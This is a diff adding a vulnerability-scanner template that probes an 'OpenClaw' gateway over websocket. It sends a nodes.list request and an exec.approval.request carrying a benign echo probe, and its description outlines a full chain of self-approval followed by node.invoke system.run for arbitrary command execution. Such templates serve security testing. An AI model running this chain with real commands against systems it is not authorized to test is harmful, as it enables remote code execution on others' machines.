@@ -1,0 +1,42 @@
+id: openclaw-full-rce
+
+info:
+  name: OpenClaw Full RCE Chain (Self-Approve + node.invoke)
+  author: lobster-guard
+  severity: critical
+  description: |
+    Tests the complete RCE chain: nodes.list to find connected nodes,
+    exec.approval.request + self-approve via exec.approval.resolve,
+    then node.invoke system.run for arbitrary command execution.
+  tags: openclaw,rce,exec,approval,critical
+
+websocket:
+  - address: "{{Host}}/gateway"
+    inputs:
+      - data: '{"jsonrpc":"2.0","id":1,"method":"nodes.list","params":null}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "nodeId"
+          - "platform"
+          - "commands"
+        condition: or
+      - type: negative
+        words:
+          - "unknown method"
+          - "unauthorized"
+
+  - address: "{{Host}}/gateway"
+    inputs:
+      - data: '{"jsonrpc":"2.0","id":2,"method":"exec.approval.request","params":{"command":"echo nuclei_rce_probe","nodeId":"*","host":"node","twoPhase":true}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "id"
+          - "approval"
+        condition: or
+      - type: negative
+        words:
+          - "unknown method"
